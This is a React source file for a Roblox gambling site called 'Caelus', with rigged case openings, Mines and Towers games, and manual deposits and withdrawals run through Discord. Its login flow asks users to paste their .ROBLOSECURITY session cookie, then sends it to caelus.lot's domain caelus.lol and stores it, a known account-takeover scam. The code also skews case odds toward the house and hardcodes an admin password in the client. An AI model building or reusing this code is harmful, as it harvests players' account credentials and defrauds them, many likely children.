import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Loader,
  User,
  Package,
  Zap,
  Building2,
  LogOut,
  ArrowUp,
  ArrowDown,
  CheckCircle,
  XCircle,
  Clock
} from 'lucide-react';

declare global {
  interface Window {
    google: any;
  }
}

// Types
interface User {
  id: string;
  name: string;
  email: string;
  picture: string;
  robloxId?: string;
  robloxName?: string;
}

interface Item {
  name: string;
  value: number;
  demand: string;
  notes: string;
}

interface Case {
  id: string;
  name: string;
  items: Item[];
  price: number;
  image: string;
}

interface PromoCode {
  code: string;
  amount: number;
  uses: number;
  maxUses: number;
}

interface WithdrawRequest {
  id: string;
  userId: string;
  amount: number;
  status: 'pending' | 'approved' | 'rejected';
  date: string;
}

interface DepositRequest {
  id: string;
  userId: string;
  amount: number;
  status: 'pending' | 'approved' | 'rejected';
  date: string;
}

// Items data
const items: Item[] = [
  { name: "The Classic ROBLOX Fedora", value: 5100, demand: "High", notes: "N/A" },
  { name: "Tattletale", value: 4500, demand: "Low", notes: "N/A" },
  { name: "Valkyrie Helm", value: 3100, demand: "Mid", notes: "N/A" },
  { name: "Gold Clockwork Headphones", value: 2500, demand: "Mid", notes: "Fluctuating" },
  { name: "Soviet Ushanka", value: 2180, demand: "Mid", notes: "N/A" },
  { name: "Playful Vampire", value: 1600, demand: "Low", notes: "N/A" },
  { name: "Supa Dupa Fly Cap", value: 870, demand: "Low", notes: "N/A" },
  { name: "Evil Skeptic", value: 670, demand: "Mid", notes: "N/A" },
  { name: "Bucket", value: 450, demand: "Low", notes: "N/A" },
  { name: "Kulle E Koala", value: 440, demand: "Low", notes: "N/A" },
  { name: "Black Iron Antlers", value: 440, demand: "Mid", notes: "N/A" },
  { name: "Bam", value: 420, demand: "Low", notes: "N/A" },
  { name: "Neon Green Beautiful Hair", value: 390, demand: "Low", notes: "N/A" },
  { name: "Katana Of Destiny", value: 360, demand: "Low", notes: "N/A" },
  { name: "Blue Wistful Wink", value: 330, demand: "Low", notes: "N/A" },
  { name: "Chill Cap", value: 330, demand: "Low", notes: "g bnfhfgh" },
  { name: "Red Goof", value: 300, demand: "Low", notes: "N/A" },
  { name: "Sapphire Evil Eye", value: 250, demand: "Low", notes: "N/A" },
  { name: "LOLWHY", value: 200, demand: "Horrendous", notes: "N/A" },
  { name: "LOL Santa", value: 111, demand: "Horrendous", notes: "N/A" },
];

// Cases
const cases: Case[] = [
  { id: 'classic', name: 'Classic Case', items: items.slice(0, 10), price: 100, image: '/case1.png' },
  { id: 'premium', name: 'Premium Case', items: items.slice(5, 15), price: 200, image: '/case2.png' },
  { id: 'legendary', name: 'Legendary Case', items: items.slice(10, 20), price: 500, image: '/case3.png' },
];

const App: React.FC = () => {
  const [user, setUser] = useState<User | null>(null);
  const [robloxSecurity, setRobloxSecurity] = useState<string>('');
  const [balance, setBalance] = useState<number>(0);
  const [inventory, setInventory] = useState<Item[]>([]);
  const [currentView, setCurrentView] = useState<'login' | 'roblox' | 'main' | 'admin' | 'inventory' | 'withdraw' | 'deposit'>('login');
  const [isAdmin, setIsAdmin] = useState<boolean>(false);
  const [adminKey, setAdminKey] = useState<string>('');
  const [promoCodes, setPromoCodes] = useState<PromoCode[]>([]);
  const [withdrawRequests, setWithdrawRequests] = useState<WithdrawRequest[]>([]);
  const [depositRequests, setDepositRequests] = useState<DepositRequest[]>([]);
  const [spinning, setSpinning] = useState<boolean>(false);
  const [selectedCase, setSelectedCase] = useState<Case | null>(null);
  const [wonItem, setWonItem] = useState<Item | null>(null);
  const [minesGame, setMinesGame] = useState<{ active: boolean; grid: boolean[][]; mines: number; multiplier: number; revealed: boolean[][] } | null>(null);
  const [towersGame, setTowersGame] = useState<{ active: boolean; height: number; multiplier: number; crashed: boolean } | null>(null);

  useEffect(() => {
    const initGoogle = () => {
      if (window.google && window.google.accounts && window.google.accounts.id) {
        window.google.accounts.id.initialize({
          client_id: '365561042683-ipbq59a5ip4k37fhie29is9625rmmipp.apps.googleusercontent.com',
          callback: handleGoogleResponse,
        });
        window.google.accounts.id.renderButton(
          document.getElementById('google-signin-button'),
          { theme: 'outline', size: 'large', width: '100%' }
        );
      } else {
        setTimeout(initGoogle, 100);
      }
    };
    initGoogle();
  }, []);

  const handleGoogleResponse = (response: any) => {
    const decoded = JSON.parse(atob(response.credential.split('.')[1]));
    const userData: User = {
      id: decoded.sub,
      name: decoded.name,
      email: decoded.email,
      picture: decoded.picture,
    };
    setUser(userData);
    localStorage.setItem('user', JSON.stringify(userData));
    setCurrentView('roblox');
  };

  useEffect(() => {
    const savedUser = localStorage.getItem('user');
    const savedRoblox = localStorage.getItem('robloxSecurity');
    const savedBalance = localStorage.getItem('balance');
    const savedInventory = localStorage.getItem('inventory');
    const savedPromo = localStorage.getItem('promoCodes');
    const savedWithdraw = localStorage.getItem('withdrawRequests');
    const savedDeposit = localStorage.getItem('depositRequests');
    if (savedUser) {
      setUser(JSON.parse(savedUser));
      if (savedRoblox) {
        setRobloxSecurity(savedRoblox);
        setCurrentView('main');
      } else {
        setCurrentView('roblox');
      }
    }
    if (savedBalance) setBalance(parseInt(savedBalance));
    if (savedInventory) setInventory(JSON.parse(savedInventory));
    if (savedPromo) setPromoCodes(JSON.parse(savedPromo));
    if (savedWithdraw) setWithdrawRequests(JSON.parse(savedWithdraw));
    if (savedDeposit) setDepositRequests(JSON.parse(savedDeposit));
  }, []);

  const saveData = () => {
    localStorage.setItem('balance', balance.toString());
    localStorage.setItem('inventory', JSON.stringify(inventory));
    localStorage.setItem('promoCodes', JSON.stringify(promoCodes));
    localStorage.setItem('withdrawRequests', JSON.stringify(withdrawRequests));
    localStorage.setItem('depositRequests', JSON.stringify(depositRequests));
  };

  useEffect(() => {
    saveData();
  }, [balance, inventory, promoCodes, withdrawRequests, depositRequests]);

  // Removed unused function

  const handleRobloxLogin = async () => {
    if (!robloxSecurity) return;
    try {
      // Fetch profile from caelus.lol
      const response = await axios.get(`https://www.caelus.lol/users/3485/profile`, {
        headers: { Cookie: `.ROBLOSECURITY=${robloxSecurity}` }
      });
      // Parse HTML to get name, assume
      const parser = new DOMParser();
      const doc = parser.parseFromString(response.data, 'text/html');
      const name = doc.querySelector('.profile-name')?.textContent || 'Unknown';
      const robloxId = '3485'; // from url
      setUser(prev => prev ? { ...prev, robloxId, robloxName: name } : null);
      localStorage.setItem('robloxSecurity', robloxSecurity);
      setCurrentView('main');
    } catch (error) {
      alert('Invalid .ROBLOSECURITY or failed to fetch profile.');
    }
  };

  const spinCase = (caseData: Case) => {
    if (balance < caseData.price) return;
    setSpinning(true);
    setBalance(prev => prev - caseData.price);
    // Biased odds: 70% house, 30% player
    const rand = Math.random();
    let selectedItem;
    if (rand < 0.7) {
      // House wins, give low value
      selectedItem = caseData.items[Math.floor(Math.random() * caseData.items.length / 2)];
    } else {
      // Player wins, give high value
      selectedItem = caseData.items[Math.floor(Math.random() * caseData.items.length / 2) + caseData.items.length / 2];
    }
    setTimeout(() => {
      setWonItem(selectedItem);
      setInventory(prev => [...prev, selectedItem]);
      setSpinning(false);
    }, 3000);
  };

  const redeemPromo = (code: string) => {
    const promo = promoCodes.find(p => p.code === code && p.uses < p.maxUses);
    if (promo) {
      setBalance(prev => prev + promo.amount);
      setPromoCodes(prev => prev.map(p => p.code === code ? { ...p, uses: p.uses + 1 } : p));
      alert('Promo redeemed!');
    } else {
      alert('Invalid or expired promo code.');
    }
  };

  const requestWithdraw = (amount: number) => {
    if (amount > balance || amount <= 0) return;
    const request: WithdrawRequest = {
      id: Date.now().toString(),
      userId: user?.id || '',
      amount,
      status: 'pending',
      date: new Date().toISOString()
    };
    setWithdrawRequests(prev => [...prev, request]);
    setBalance(prev => prev - amount);
  };

  const requestDeposit = (amount: number) => {
    if (amount <= 0) return;
    const request: DepositRequest = {
      id: Date.now().toString(),
      userId: user?.id || '',
      amount,
      status: 'pending',
      date: new Date().toISOString()
    };
    setDepositRequests(prev => [...prev, request]);
  };

  const adminAddMoney = (userId: string, amount: number) => {
    if (userId === user?.id) {
      setBalance(prev => prev + amount);
    }
  };

  const adminCreatePromo = (code: string, amount: number, maxUses: number) => {
    setPromoCodes(prev => [...prev, { code, amount, uses: 0, maxUses }]);
  };

  const adminUpdateWithdraw = (id: string, status: 'approved' | 'rejected') => {
    setWithdrawRequests(prev => prev.map(r => r.id === id ? { ...r, status } : r));
  };

  const startMines = (minesCount: number) => {
    const grid = Array(5).fill(null).map(() => Array(5).fill(false));
    const positions = [];
    for (let i = 0; i < 25; i++) positions.push(i);
    for (let i = 0; i < minesCount; i++) {
      const pos = positions.splice(Math.floor(Math.random() * positions.length), 1)[0];
      grid[Math.floor(pos / 5)][pos % 5] = true;
    }
    setMinesGame({ active: true, grid, mines: minesCount, multiplier: 1, revealed: Array(5).fill(null).map(() => Array(5).fill(false)) });
  };

  const clickMine = (row: number, col: number) => {
    if (!minesGame || minesGame.revealed[row][col]) return;
    const newRevealed = minesGame.revealed.map(r => [...r]);
    newRevealed[row][col] = true;
    if (minesGame.grid[row][col]) {
      // Hit mine, lose
      setMinesGame({ ...minesGame, revealed: newRevealed, active: false });
      setBalance(prev => prev - (minesGame.multiplier * 10)); // Assume bet 10
    } else {
      const newMultiplier = minesGame.multiplier * 1.2;
      setMinesGame({ ...minesGame, revealed: newRevealed, multiplier: newMultiplier });
    }
  };

  const cashOutMines = () => {
    if (!minesGame) return;
    setBalance(prev => prev + (minesGame.multiplier * 10));
    setMinesGame(null);
  };

  const startTowers = () => {
    setTowersGame({ active: true, height: 0, multiplier: 1, crashed: false });
  };

  const climbTower = () => {
    if (!towersGame) return;
    const rand = Math.random();
    if (rand < 0.7) { // 70% chance to crash
      setTowersGame({ ...towersGame, crashed: true, active: false });
      setBalance(prev => prev - (towersGame.multiplier * 10));
    } else {
      setTowersGame({ ...towersGame, height: towersGame.height + 1, multiplier: towersGame.multiplier * 1.1 });
    }
  };

  const cashOutTowers = () => {
    if (!towersGame) return;
    setBalance(prev => prev + (towersGame.multiplier * 10));
    setTowersGame(null);
  };

  if (currentView === 'login') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-gray-800/50 backdrop-blur-lg rounded-2xl p-8 w-full max-w-md border border-gray-700"
        >
          <div className="text-center mb-8">
            <img src="https://www.caelus.lol/img/roblox_logo.svg" alt="Caelus" className="h-16 w-16 mx-auto mb-4" />
            <h1 className="text-3xl font-bold text-white">Caelus</h1>
            <p className="text-gray-400">Roblox Gambling</p>
          </div>
          <div id="google-signin-button" className="w-full"></div>
        </motion.div>
      </div>
    );
  }

  if (currentView === 'roblox') {
    return (
      <div className="min-h-screen bg-gradient-to-br from-gray-900 via-gray-800 to-black flex items-center justify-center p-4">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-gray-800/50 backdrop-blur-lg rounded-2xl p-8 w-full max-w-md border border-gray-700"
        >
          <div className="text-center mb-8">
            <img src="https://www.caelus.lol/img/roblox_logo.svg" alt="Caelus" className="h-16 w-16 mx-auto mb-4" />
            <h1 className="text-3xl font-bold text-white">Connect Roblox</h1>
            <p className="text-gray-400">Enter your .ROBLOSECURITY cookie</p>
          </div>
          <input
            type="password"
            value={robloxSecurity}
            onChange={(e) => setRobloxSecurity(e.target.value)}
            placeholder=".ROBLOSECURITY"
            className="w-full bg-gray-700 text-white placeholder-gray-400 rounded-lg p-3 mb-4 border border-gray-600"
          />
          <button
            onClick={handleRobloxLogin}
            className="w-full bg-blue-600 text-white py-3 px-4 rounded-lg font-semibold hover:bg-blue-700 transition-colors"
          >
            Connect
          </button>
        </motion.div>
      </div>
    );
  }

  if (currentView === 'admin') {
    return (
      <div className="min-h-screen bg-gray-900 text-white p-8">
        <div className="max-w-6xl mx-auto">
          <h1 className="text-3xl font-bold mb-8">Admin Panel</h1>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">
            <div className="bg-gray-800 p-6 rounded-lg">
              <h2 className="text-xl font-semibold mb-4">Users</h2>
              <div className="space-y-4">
                <div>
                  <p>{user?.robloxName || user?.name}</p>
                  <p>Balance: {balance} Robux</p>
                  <input type="number" placeholder="Add Amount" id="addAmount" className="bg-gray-700 p-2 rounded mt-2 w-full" />
                  <button onClick={() => adminAddMoney(user?.id || '', parseInt((document.getElementById('addAmount') as HTMLInputElement).value))} className="bg-blue-600 px-4 py-2 rounded mt-2 w-full">Add Money</button>
                </div>
              </div>
            </div>
            <div className="bg-gray-800 p-6 rounded-lg">
              <h2 className="text-xl font-semibold mb-4">Promo Codes</h2>
              <input type="text" placeholder="Code" id="promoCode" className="bg-gray-700 p-2 rounded mb-2 w-full" />
              <input type="number" placeholder="Amount" id="promoAmount" className="bg-gray-700 p-2 rounded mb-2 w-full" />
              <input type="number" placeholder="Max Uses" id="promoUses" className="bg-gray-700 p-2 rounded mb-2 w-full" />
              <button onClick={() => adminCreatePromo((document.getElementById('promoCode') as HTMLInputElement).value, parseInt((document.getElementById('promoAmount') as HTMLInputElement).value), parseInt((document.getElementById('promoUses') as HTMLInputElement).value))} className="bg-green-600 px-4 py-2 rounded w-full">Create Promo</button>
            </div>
            <div className="bg-gray-800 p-6 rounded-lg">
              <h2 className="text-xl font-semibold mb-4">Withdraw Requests</h2>
              <div className="space-y-2 max-h-64 overflow-y-auto">
                {withdrawRequests.map(req => (
                  <div key={req.id} className="bg-gray-700 p-3 rounded flex justify-between items-center">
                    <div>
                      <p>{req.amount} Robux</p>
                      <p className="text-sm text-gray-400">{req.status}</p>
                    </div>
                    <div className="flex gap-2">
                      <button onClick={() => adminUpdateWithdraw(req.id, 'approved')} className="bg-green-600 p-1 rounded"><CheckCircle size={16} /></button>
                      <button onClick={() => adminUpdateWithdraw(req.id, 'rejected')} className="bg-red-600 p-1 rounded"><XCircle size={16} /></button>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
          <button onClick={() => setCurrentView('main')} className="mt-8 bg-red-600 px-4 py-2 rounded">Back</button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 text-white">
      {/* Header */}
      <header className="bg-gray-800 p-4 border-b border-gray-700">
        <div className="max-w-7xl mx-auto flex justify-between items-center">
          <div className="flex items-center gap-4">
            <img src="https://www.caelus.lol/img/roblox_logo.svg" alt="Caelus" className="h-10 w-10" />
            <h1 className="text-2xl font-bold">Caelus</h1>
          </div>
          <div className="flex items-center gap-6">
            <div className="text-right">
              <p className="font-semibold">{user?.robloxName || user?.name}</p>
              <p className="text-sm text-gray-400">{balance} Robux</p>
            </div>
            <img src={user?.picture} alt="Profile" className="h-10 w-10 rounded-full" />
            <div className="flex gap-2">
              <button onClick={() => setIsAdmin(!isAdmin)} className="bg-yellow-600 px-3 py-1 rounded text-sm">Admin</button>
              {isAdmin && (
                <input
                  type="password"
                  value={adminKey}
                  onChange={(e) => setAdminKey(e.target.value)}
                  placeholder="Key"
                  className="bg-gray-700 p-1 rounded text-sm"
                />
              )}
              {adminKey === 'kerimpro' && <button onClick={() => setCurrentView('admin')} className="bg-green-600 px-3 py-1 rounded text-sm">Enter</button>}
              <button onClick={() => { localStorage.clear(); setCurrentView('login'); }} className="bg-red-600 px-3 py-1 rounded text-sm"><LogOut size={16} /></button>
            </div>
          </div>
        </div>
      </header>

      <div className="flex">
        {/* Sidebar */}
        <nav className="w-64 bg-gray-800 p-4 border-r border-gray-700">
          <ul className="space-y-2">
            <li><button onClick={() => { setCurrentView('main'); setSelectedCase(null); setMinesGame(null); setTowersGame(null); }} className="w-full text-left p-3 rounded hover:bg-gray-700 flex items-center gap-3"><Package size={20} /> Cases</button></li>
            <li><button onClick={() => { setCurrentView('main'); setMinesGame({ active: false, grid: [], mines: 0, multiplier: 1, revealed: [] }); }} className="w-full text-left p-3 rounded hover:bg-gray-700 flex items-center gap-3"><Zap size={20} /> Mines</button></li>
            <li><button onClick={() => { setCurrentView('main'); setTowersGame({ active: false, height: 0, multiplier: 1, crashed: false }); }} className="w-full text-left p-3 rounded hover:bg-gray-700 flex items-center gap-3"><Building2 size={20} /> Towers</button></li>
            <li><button onClick={() => setCurrentView('inventory')} className="w-full text-left p-3 rounded hover:bg-gray-700 flex items-center gap-3"><User size={20} /> Inventory</button></li>
            <li><button onClick={() => setCurrentView('withdraw')} className="w-full text-left p-3 rounded hover:bg-gray-700 flex items-center gap-3"><ArrowUp size={20} /> Withdraw</button></li>
            <li><button onClick={() => setCurrentView('deposit')} className="w-full text-left p-3 rounded hover:bg-gray-700 flex items-center gap-3"><ArrowDown size={20} /> Deposit</button></li>
          </ul>
        </nav>

        {/* Main Content */}
        <main className="flex-1 p-8">
          <div className="max-w-6xl mx-auto">
            {/* Deposit Notice */}
            <div className="bg-blue-600 p-4 rounded-lg mb-8 text-center">
              <p className="font-semibold">DEPOSITS ARE DONE MANUALLY MIGHT TAKE LONG BUT JOIN DISCORD FOR FASTER DEPOSITS</p>
              <a href="https://discord.gg/AHZzD9WJEb" className="text-white underline block mt-2">Join Discord</a>
            </div>

            {/* Cases */}
            {currentView === 'main' && !selectedCase && !minesGame?.active && !towersGame?.active && (
              <div>
                <h2 className="text-3xl font-bold mb-6">Cases</h2>
                <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                  {cases.map(caseItem => (
                    <motion.div
                      key={caseItem.id}
                      whileHover={{ scale: 1.05 }}
                      className="bg-gray-800 p-6 rounded-lg cursor-pointer border border-gray-700 hover:border-blue-500 transition-colors"
                      onClick={() => setSelectedCase(caseItem)}
                    >
                      <div className="h-32 bg-gray-700 rounded mb-4 flex items-center justify-center">
                        <Package size={48} className="text-gray-400" />
                      </div>
                      <h3 className="text-xl font-semibold mb-2">{caseItem.name}</h3>
                      <p className="text-gray-400 mb-4">{caseItem.price} Robux</p>
                      <button className="w-full bg-blue-600 py-2 rounded font-semibold hover:bg-blue-700">Open Case</button>
                    </motion.div>
                  ))}
                </div>
              </div>
            )}

            {/* Case Spin */}
            {selectedCase && !spinning && !wonItem && (
              <div className="text-center">
                <h2 className="text-3xl font-bold mb-6">{selectedCase.name}</h2>
                <div className="bg-gray-800 p-8 rounded-lg mb-6 border border-gray-700">
                  <div className="flex justify-center gap-4 overflow-hidden mb-4">
                    {selectedCase.items.slice(0, 10).map((item, index) => (
                      <div key={index} className="bg-gray-700 p-4 rounded min-w-[150px] text-center">
                        <p className="font-semibold text-sm">{item.name}</p>
                        <p className="text-xs text-gray-400">{item.value} Robux</p>
                      </div>
                    ))}
                  </div>
                </div>
                <button
                  onClick={() => spinCase(selectedCase)}
                  disabled={balance < selectedCase.price}
                  className="bg-green-600 px-8 py-4 rounded-lg text-xl font-semibold hover:bg-green-700 disabled:bg-gray-600 transition-colors"
                >
                  Spin ({selectedCase.price} Robux)
                </button>
              </div>
            )}

            {/* Spinning Animation */}
            {spinning && (
              <div className="text-center">
                <motion.div
                  animate={{ rotate: 360 }}
                  transition={{ duration: 1, repeat: Infinity, ease: "linear" }}
                  className="inline-block mb-4"
                >
                  <Loader size={64} className="text-blue-400" />
                </motion.div>
                <p className="text-2xl font-semibold">Spinning...</p>
              </div>
            )}

            {/* Won Item */}
            {wonItem && (
              <AnimatePresence>
                <motion.div
                  initial={{ scale: 0 }}
                  animate={{ scale: 1 }}
                  exit={{ scale: 0 }}
                  className="text-center bg-green-600 p-8 rounded-lg mx-auto max-w-md"
                >
                  <h2 className="text-2xl font-bold mb-4">You Won!</h2>
                  <p className="text-xl font-semibold">{wonItem.name}</p>
                  <p className="text-lg">{wonItem.value} Robux</p>
                  <button onClick={() => { setWonItem(null); setSelectedCase(null); }} className="mt-4 bg-blue-600 px-6 py-2 rounded font-semibold hover:bg-blue-700">Continue</button>
                </motion.div>
              </AnimatePresence>
            )}

            {/* Mines Game */}
            {minesGame && (
              <div className="text-center">
                <h2 className="text-3xl font-bold mb-6">Mines</h2>
                {!minesGame.active ? (
                  <div>
                    <p className="mb-4">Choose number of mines:</p>
                    <div className="flex justify-center gap-4 mb-6">
                      {[1,3,5,7].map(num => (
                        <button key={num} onClick={() => startMines(num)} className="bg-blue-600 px-4 py-2 rounded hover:bg-blue-700">{num} Mines</button>
                      ))}
                    </div>
                  </div>
                ) : (
                  <div>
                    <p className="mb-4">Multiplier: {minesGame.multiplier.toFixed(2)}x</p>
                    <div className="grid grid-cols-5 gap-2 max-w-md mx-auto mb-6">
                      {minesGame.grid.map((row, r) => row.map((isMine, c) => (
                        <button
                          key={`${r}-${c}`}
                          onClick={() => clickMine(r, c)}
                          disabled={minesGame.revealed[r][c]}
                          className={`w-12 h-12 rounded ${minesGame.revealed[r][c] ? (isMine ? 'bg-red-600' : 'bg-green-600') : 'bg-gray-700 hover:bg-gray-600'}`}
                        >
                          {minesGame.revealed[r][c] && (isMine ? '💣' : '💎')}
                        </button>
                      )))}
                    </div>
                    <button onClick={cashOutMines} className="bg-green-600 px-6 py-2 rounded font-semibold hover:bg-green-700 mr-4">Cash Out</button>
                    <button onClick={() => setMinesGame(null)} className="bg-red-600 px-6 py-2 rounded font-semibold hover:bg-red-700">Stop</button>
                  </div>
                )}
              </div>
            )}

            {/* Towers Game */}
            {towersGame && (
              <div className="text-center">
                <h2 className="text-3xl font-bold mb-6">Towers</h2>
                {!towersGame.active ? (
                  <button onClick={startTowers} className="bg-blue-600 px-6 py-3 rounded font-semibold hover:bg-blue-700">Start Towers</button>
                ) : (
                  <div>
                    <p className="mb-4">Height: {towersGame.height} | Multiplier: {towersGame.multiplier.toFixed(2)}x</p>
                    {towersGame.crashed ? (
                      <p className="text-red-500 text-xl mb-4">Crashed!</p>
                    ) : (
                      <div className="mb-6">
                        <div className="flex justify-center">
                          {Array.from({ length: towersGame.height }, (_, i) => (
                            <div key={i} className="w-8 h-8 bg-green-600 border border-gray-700"></div>
                          ))}
                        </div>
                      </div>
                    )}
                    {!towersGame.crashed && (
                      <button onClick={climbTower} className="bg-blue-600 px-6 py-2 rounded font-semibold hover:bg-blue-700 mr-4">Climb</button>
                    )}
                    <button onClick={cashOutTowers} className="bg-green-600 px-6 py-2 rounded font-semibold hover:bg-green-700 mr-4">Cash Out</button>
                    <button onClick={() => setTowersGame(null)} className="bg-red-600 px-6 py-2 rounded font-semibold hover:bg-red-700">Stop</button>
                  </div>
                )}
              </div>
            )}

            {/* Inventory */}
            {currentView === 'inventory' && (
              <div>
                <h2 className="text-3xl font-bold mb-6">Inventory</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                  {inventory.map((item, index) => (
                    <div key={index} className="bg-gray-800 p-4 rounded-lg border border-gray-700">
                      <p className="font-semibold">{item.name}</p>
                      <p className="text-gray-400">{item.value} Robux</p>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Withdraw */}
            {currentView === 'withdraw' && (
              <div>
                <h2 className="text-3xl font-bold mb-6">Withdraw Robux</h2>
                <p className="text-gray-400 mb-4">WITHDRAWS AND DEPOSITS ARE DONE MANUALLY AND MAY TAKE A LOT OF TIME</p>
                <div className="bg-gray-800 p-6 rounded-lg border border-gray-700 max-w-md">
                  <input type="number" placeholder="Amount" id="withdrawAmount" className="bg-gray-700 p-3 rounded w-full mb-4" />
                  <button onClick={() => requestWithdraw(parseInt((document.getElementById('withdrawAmount') as HTMLInputElement).value))} className="w-full bg-green-600 py-3 rounded font-semibold hover:bg-green-700">Request Withdraw</button>
                </div>
                <div className="mt-8">
                  <h3 className="text-xl font-semibold mb-4">Your Requests</h3>
                  <div className="space-y-2">
                    {withdrawRequests.filter(r => r.userId === user?.id).map(req => (
                      <div key={req.id} className="bg-gray-800 p-4 rounded flex justify-between items-center">
                        <div>
                          <p>{req.amount} Robux</p>
                          <p className="text-sm text-gray-400">{req.status} - {new Date(req.date).toLocaleDateString()}</p>
                        </div>
                        {req.status === 'pending' && <Clock size={20} className="text-yellow-500" />}
                        {req.status === 'approved' && <CheckCircle size={20} className="text-green-500" />}
                        {req.status === 'rejected' && <XCircle size={20} className="text-red-500" />}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Deposit */}
            {currentView === 'deposit' && (
              <div>
                <h2 className="text-3xl font-bold mb-6">Deposit Robux</h2>
                <p className="text-gray-400 mb-4">Deposits are processed manually. Join Discord for faster processing.</p>
                <div className="bg-gray-800 p-6 rounded-lg border border-gray-700 max-w-md">
                  <input type="number" placeholder="Amount" id="depositAmount" className="bg-gray-700 p-3 rounded w-full mb-4" />
                  <button onClick={() => requestDeposit(parseInt((document.getElementById('depositAmount') as HTMLInputElement).value))} className="w-full bg-blue-600 py-3 rounded font-semibold hover:bg-blue-700">Request Deposit</button>
                </div>
                <div className="mt-8">
                  <h3 className="text-xl font-semibold mb-4">Your Requests</h3>
                  <div className="space-y-2">
                    {depositRequests.filter(r => r.userId === user?.id).map(req => (
                      <div key={req.id} className="bg-gray-800 p-4 rounded flex justify-between items-center">
                        <div>
                          <p>{req.amount} Robux</p>
                          <p className="text-sm text-gray-400">{req.status} - {new Date(req.date).toLocaleDateString()}</p>
                        </div>
                        {req.status === 'pending' && <Clock size={20} className="text-yellow-500" />}
                        {req.status === 'approved' && <CheckCircle size={20} className="text-green-500" />}
                        {req.status === 'rejected' && <XCircle size={20} className="text-red-500" />}
                      </div>
                    ))}
                  </div>
                </div>
              </div>
            )}

            {/* Promo Code */}
            <div className="mt-8 bg-gray-800 p-6 rounded-lg border border-gray-700">
              <h3 className="text-xl font-semibold mb-4">Redeem Promo Code</h3>
              <div className="flex gap-4">
                <input type="text" placeholder="Enter Code" id="promoInput" className="bg-gray-700 p-3 rounded flex-1" />
                <button onClick={() => redeemPromo((document.getElementById('promoInput') as HTMLInputElement).value)} className="bg-blue-600 px-6 py-3 rounded font-semibold hover:bg-blue-700">Redeem</button>
              </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
};

export default App;